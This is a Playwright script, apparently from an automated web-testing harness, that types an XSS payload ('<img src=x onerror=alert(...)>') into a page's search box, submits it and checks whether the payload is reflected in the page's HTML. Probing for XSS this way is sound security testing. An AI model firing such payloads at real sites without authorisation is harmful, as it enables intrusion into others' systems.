import path from 'path';

export default async function(page, fileUrl, screenshotsDir) {
  try {
    // Navigate to the HTML file
    await page.goto(fileUrl);
    await page.waitForLoadState('networkidle');

    // Take initial screenshot
    const screenshots = [];
    await page.screenshot({ path: path.join(screenshotsDir, 'step_1_initial.png') });
    screenshots.push(path.join(screenshotsDir, 'step_1_initial.png'));

    // Wait for the search input using ID selector
    await page.waitForSelector('#searchInput', { timeout: 5000 });

    // Attempt XSS via search input
    const xssPayload = `<img src=x onerror=alert('XSS')>`;
    await page.fill('#searchInput', xssPayload);

    // Take screenshot after filling XSS payload
    await page.screenshot({ path: path.join(screenshotsDir, 'step_2_xss_payload_filled.png') });
    screenshots.push(path.join(screenshotsDir, 'step_2_xss_payload_filled.png'));

    // Wait for the search button (try class, then fallback to another selector if needed)
    let searchBtn = await page.$('.search-btn');
    if (!searchBtn) {
      // Fallback: try button by text or XPath if not found
      searchBtn = await page.$('button:has-text("Search")');
      if (!searchBtn) {
        searchBtn = await page.$('//button[contains(@class, "search-btn")]');
      }
    }

    // Click the search button
    if (searchBtn) {
      await searchBtn.click();
    } else {
      throw new Error('Search button not found');
    }

    // Wait for possible DOM update after search (wait for mainContent or search results)
    await page.waitForSelector('#mainContent', { timeout: 5000 });

    // Take screenshot after search submission
    await page.screenshot({ path: path.join(screenshotsDir, 'step_3_after_search.png') });
    screenshots.push(path.join(screenshotsDir, 'step_3_after_search.png'));

    // Extract any HTML containing the payload in the results (for verification)
    // We'll search for the payload string in the main content area
    const mainContentHTML = await page.$eval('#mainContent', el => el.innerHTML);
    const xssFound = mainContentHTML.includes(xssPayload);

    return {
      success: true,
      action: "Attempted XSS via search input and submitted the payload",
      extractedData: {
        xssPayload,
        xssReflectedInDOM: xssFound
      },
      screenshots,
      error: null
    };
  } catch (error) {
    return {
      success: false,
      action: "Failed to complete task",
      extractedData: {},
      screenshots: [],
      error: error.message
    };
  }
}
